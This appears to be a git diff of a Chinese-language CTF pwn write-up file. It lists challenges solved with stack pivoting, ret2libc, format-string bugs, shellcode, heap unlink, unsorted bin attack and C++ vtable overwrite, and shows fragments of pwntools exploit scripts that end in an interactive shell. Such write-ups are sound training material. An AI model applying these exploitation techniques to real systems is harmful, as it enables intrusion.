@@ -1,7 +1,5 @@
 # bllhl_mom
-
 简单的32位栈迁移
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -57,11 +55,8 @@ p.send(payload)
 
 p.interactive()
 ```
-
 # koi
-
 ret2libc
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -128,11 +123,8 @@ p.sendline(payload)
 
 p.interactive()
 ```
-
 # Libc
-
 32位ret2libc
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -180,11 +172,8 @@ p.sendline(payload)
 
 p.interactive()
 ```
-
 # fmt_text
-
 简单的格式化字符串漏洞+32位栈溢出
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -228,11 +217,8 @@ pause()
 p.sendline(b'/bin/sh\x00')
 p.interactive()
 ```
-
 # bllbl_shellcode_2
-
 shellcode构造题
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -279,11 +265,8 @@ p.send(payload)
 
 p.interactive()
 ```
-
 # bll_ezheap1
-
 unlink修改list
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -353,11 +336,8 @@ choose(5)
 
 p.interactive()
 ```
-
 # Thinks
-
 标准的unsorted bin attack任意写一个大数
-
 ```Python
 from pwn import *
 from wstube import websocket
@@ -416,11 +396,8 @@ create(0x80, b'c' * 0x80) #4
 chosen(0x145c)
 p.interactive()
 ```
-
 # Garden
-
 c++堆题，虚函数覆盖
-
 ```Python
 from pwn import *
 from wstube import websocket
